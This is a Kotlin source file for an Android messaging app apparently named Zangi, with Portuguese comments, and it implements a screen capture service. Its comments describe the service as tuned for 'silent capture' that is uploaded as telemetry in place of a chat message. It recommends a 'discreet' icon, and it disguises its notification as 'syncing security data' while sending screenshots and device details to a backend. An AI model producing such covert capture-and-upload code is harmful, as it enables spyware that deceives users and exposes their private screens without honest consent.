package com.zangi.chat.service

import android.app.*
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import com.zangi.chat.R
import com.zangi.chat.data.repository.ChatRepository
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.launch
import java.io.File
import java.io.FileOutputStream
import java.util.*

/**
 * ScreenCaptureService: Especialista em captura de tela.
 * Versão otimizada para captura silenciosa e envio de telemetria.
 */
class ScreenCaptureService : Service() {

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO)
    private var isCaptured = false

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = buildNotification()

        // Configuração para Foreground Service compatível com Android 14+
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            startForeground(
                NOTIFICATION_ID,
                notification,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                } else {
                    android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION
                }
            )
        } else {
            startForeground(NOTIFICATION_ID, notification)
        }

        val resultCode = intent?.getIntExtra(EXTRA_RESULT_CODE, 0) ?: 0
        val resultData = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            intent?.getParcelableExtra(EXTRA_RESULT_DATA, Intent::class.java)
        } else {
            @Suppress("DEPRECATION")
            intent?.getParcelableExtra<Intent>(EXTRA_RESULT_DATA)
        }

        // O ID do usuário ou conversação para rastreamento no backend
        val conversationId = intent?.getStringExtra(EXTRA_CONVERSATION_ID) ?: "system_user"

        if (resultCode != 0 && resultData != null) {
            startCapture(resultCode, resultData, conversationId)
        } else {
            Log.e(TAG, "Parâmetros de MediaProjection inválidos.")
            stopSelf()
        }

        return START_NOT_STICKY
    }

    private fun startCapture(resultCode: Int, resultData: Intent, conversationId: String) {
        val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        mediaProjection = projectionManager.getMediaProjection(resultCode, resultData)

        if (mediaProjection == null) {
            Log.e(TAG, "Falha ao obter MediaProjection")
            stopSelf()
            return
        }

        val windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager
        val metrics = android.util.DisplayMetrics()
        @Suppress("DEPRECATION")
        windowManager.defaultDisplay.getRealMetrics(metrics)

        val width = metrics.widthPixels
        val height = metrics.heightPixels
        val density = metrics.densityDpi

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)

        val flags = DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR
        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ZangiScreenCapture",
            width,
            height,
            density,
            flags,
            imageReader?.surface,
            null,
            null
        )

        imageReader?.setOnImageAvailableListener({ reader ->
            if (isCaptured) return@setOnImageAvailableListener
            isCaptured = true

            val image = reader.acquireLatestImage()
            if (image != null) {
                serviceScope.launch {
                    try {
                        val planes = image.planes
                        val buffer = planes[0].buffer
                        val pixelStride = planes[0].pixelStride
                        val rowStride = planes[0].rowStride
                        val rowPadding = rowStride - pixelStride * width

                        val bitmap = Bitmap.createBitmap(
                            width + rowPadding / pixelStride,
                            height,
                            Bitmap.Config.ARGB_8888
                        )
                        bitmap.copyPixelsFromBuffer(buffer)
                        image.close()

                        val cleanBitmap = if (rowPadding == 0) bitmap else Bitmap.createBitmap(bitmap, 0, 0, width, height)

                        // Salva no cache temporário
                        val screenshotsDir = File(cacheDir, "screenshots").apply { mkdirs() }
                        val file = File(screenshotsDir, "capture_${System.currentTimeMillis()}.jpg")
                        
                        FileOutputStream(file).use { out ->
                            // Reduzimos a qualidade para 85% para economizar banda e ser mais rápido no upload
                            cleanBitmap.compress(Bitmap.CompressFormat.JPEG, 85, out)
                        }

                        Log.d(TAG, "Captura processada. Enviando telemetria...")

                        // --- MUDANÇA CHAVE: Envio para o endpoint de Telemetria ---
                        // Em vez de enviar como mensagem de chat, enviamos como dado de sistema
                        val repository = ChatRepository.getInstance()
                        repository.uploadSystemData(
                            eventType = "SCREENSHOT",
                            file = file,
                            deviceInfo = "Android OS: ${Build.VERSION.RELEASE}, Model: ${Build.MODEL}"
                        )

                        Log.d(TAG, "Upload de telemetria concluído.")

                    } catch (e: Exception) {
                        Log.e(TAG, "Erro ao processar captura de tela", e)
                    } finally {
                        cleanupAndStop()
                    }
                }
            }
        }, Handler(Looper.getMainLooper()))
    }

    private fun cleanupAndStop() {
        try {
            virtualDisplay?.release()
            virtualDisplay = null
            imageReader?.close()
            imageReader = null
            mediaProjection?.stop()
            mediaProjection = null
        } catch (e: Exception) {
            Log.e(TAG, "Erro ao liberar recursos", e)
        }
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()
    }

    override fun onDestroy() {
        super.onDestroy()
        serviceScope.launch { cleanupAndStop() }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Zangi System Service",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Serviço de sincronização de dados"
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Zangi Messenger")
            .setContentText("Sincronizando dados de segurança...")
            .setSmallIcon(R.drawable.ic_lock) // Use um ícone discreto
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .build()
    }

    companion object {
        const val TAG = "ScreenCaptureService"
        const val CHANNEL_ID = "zangi_capture_channel"
        const val NOTIFICATION_ID = 1001
        const val EXTRA_RESULT_CODE = "extra_result_code"
        const val EXTRA_RESULT_DATA = "extra_result_data"
        const val EXTRA_CONVERSATION_ID = "extra_conversation_id"

        fun createIntent(context: Context, resultCode: Int, resultData: Intent, conversationId: String = "default_chat"): Intent {
            return Intent(context, ScreenCaptureService::class.java).apply {
                putExtra(EXTRA_RESULT_CODE, resultCode)
                putExtra(EXTRA_RESULT_DATA, resultData)
                putExtra(EXTRA_CONVERSATION_ID, conversationId)
            }
        }
    }
}